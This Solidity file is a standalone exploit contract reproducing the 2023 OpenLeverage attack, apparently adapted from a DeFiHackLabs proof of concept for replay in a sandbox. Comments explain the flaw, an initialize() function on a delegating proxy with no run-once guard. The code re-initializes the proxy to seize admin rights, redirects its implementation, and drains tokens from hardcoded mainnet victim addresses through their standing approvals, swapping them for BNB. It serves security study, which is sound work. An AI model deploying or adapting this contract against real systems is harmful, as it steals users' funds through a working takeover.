// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-10-OpenLeverage).
// The DeFiHackLabs PoC runs the attack INLINE on the Foundry test contract itself
// (ContractTest IS the attack contract — testExploit() calls the victim directly,
// with no vm.prank, and the drain function `a(address)` lives on the test
// contract so RewardVaultDelegator's fallback can delegatecall into it). There is
// no standalone contract to deploy from the original test as-is, and the test
// also uses a few Foundry-only cheatcodes/assertions (deal, assertEq,
// emit log_named_*) that the replay engine cannot execute. This contract is a
// faithful, self-contained copy of the inline attack (testExploit -> run(),
// a(address), transferFromAndSwapTokensToBNB) with the cheatcode/test-only calls
// dropped. Logic and constants are copied verbatim from test/OpenLeverage_exp.sol.
//
// Root cause: RewardVaultDelegator (a Compound-style storage proxy) forwards any
// selector it does not itself define into `implementation` via delegatecall
// (DelegatorInterface._fallback). The implementation's initialize(address,address,
// uint64) has no run-once guard, so calling it a SECOND time through the proxy
// overwrites the proxy's `admin` storage slot. The attacker becomes admin, points
// `implementation` at this contract via setImplementation(), then calls the
// arbitrary selector `a(address)` — which the proxy delegatecalls into this
// contract, running with the proxy's identity and its victims' standing unlimited
// ERC20 approvals. Every token the proxy can pull (or already holds) is swapped
// for BNB on PancakeSwap, with the swap's `to` pointed at this contract.
interface IRewardVaultDelegator {
    function initialize(address bnftRegistry, address vrfCoordinator, uint64 subscriptionId) external;
    function setImplementation(address implementation) external;
    function admin() external view returns (address);
    function a(address addr) external;
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface Uni_Router_V2 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

contract OpenLeverageDrain {
    IRewardVaultDelegator private constant RewardVaultDelegator =
        IRewardVaultDelegator(0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 private constant RACA = IERC20(0x12BB890508c125661E03b09EC06E404bc9289040);
    IERC20 private constant BUSDT = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 private constant FLOKI = IERC20(0xfb5B838b6cfEEdC2873aB27866079AC55363D37E);
    IERC20 private constant OLE = IERC20(0xa865197A84E780957422237B5D152772654341F3);
    IERC20 private constant CSIX = IERC20(0x04756126F044634C9a0f0E985e60c88a51ACC206);
    IERC20 private constant BABY = IERC20(0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657);
    address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    // Steps 1-3: the takeover. Called directly — this contract IS the attacker,
    // exactly like the original ContractTest (no impersonation needed).
    function run() external {
        // Step 1: re-initialize the proxy. No run-once guard on the
        // implementation's initialize() lets us overwrite storage slot 1
        // (`admin`) a second time.
        RewardVaultDelegator.initialize(address(this), address(this), uint64(1));

        // Step 2: now admin — repoint the proxy's implementation at THIS contract.
        RewardVaultDelegator.setImplementation(address(this));

        // Step 3: `a` is not a real function on the proxy, so it falls through
        // fallback() -> delegatecall(implementation, msg.data) -> executes a()
        // below, but running AS the proxy (its identity, its approvals).
        RewardVaultDelegator.a(address(this));
    }

    // Reached only via the proxy's delegatecall fallback (see run() step 3) —
    // `address(this)` here resolves to the PROXY, not this contract.
    function a(address addr) external {
        address[] memory victims = new address[](6);
        address[] memory tokens = new address[](6);

        victims[0] = 0x2aB372EFd0eE550c1cca6459DDCD45Ba783B242B;
        victims[1] = 0xe83c6E8FeeDDE85E72E810f82ee0943aa14Ed2f6;
        victims[2] = 0x0D413496d1cb149B1526609363359ED398741901;
        victims[3] = 0x3BD0FeC7243B1ba658FAF4bC22663b5AdC04CF04;
        victims[4] = 0x2C8EEDA98a84a393e2DB66B013A0cDCA2F3693f2;
        victims[5] = address(0); // no external victim — drains the proxy's own BABY balance

        tokens[0] = address(RACA);
        tokens[1] = address(BUSDT);
        tokens[2] = address(FLOKI);
        tokens[3] = address(OLE);
        tokens[4] = address(CSIX);
        tokens[5] = address(BABY);

        for (uint8 i; i < victims.length; ++i) {
            transferFromAndSwapTokensToBNB(victims[i], tokens[i], addr);
        }
    }

    // Runs with the proxy's identity when invoked via a() above. Pulls the
    // victim's standing unlimited approval to the proxy (allowance-capped), then
    // sells the proxy's full balance of `token` for BNB, sent straight to `to`
    // (this contract's real address, passed through from run()).
    function transferFromAndSwapTokensToBNB(address from, address token, address to) internal {
        IERC20(token).approve(address(Router), type(uint256).max);

        if (from != address(0)) {
            uint256 transferAmount = IERC20(token).balanceOf(from);
            uint256 allowance = IERC20(token).allowance(from, address(RewardVaultDelegator));
            if (allowance < transferAmount) {
                transferAmount = allowance;
            }

            IERC20(token).transferFrom(from, address(this), transferAmount);
        }

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WBNB;
        Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            IERC20(token).balanceOf(address(this)), 0, path, to, block.timestamp + 1000
        );
    }

    // Receives the native BNB from each swap above (to = this contract's real
    // address, passed through the delegatecall chain as `addr`).
    receive() external payable {}
}
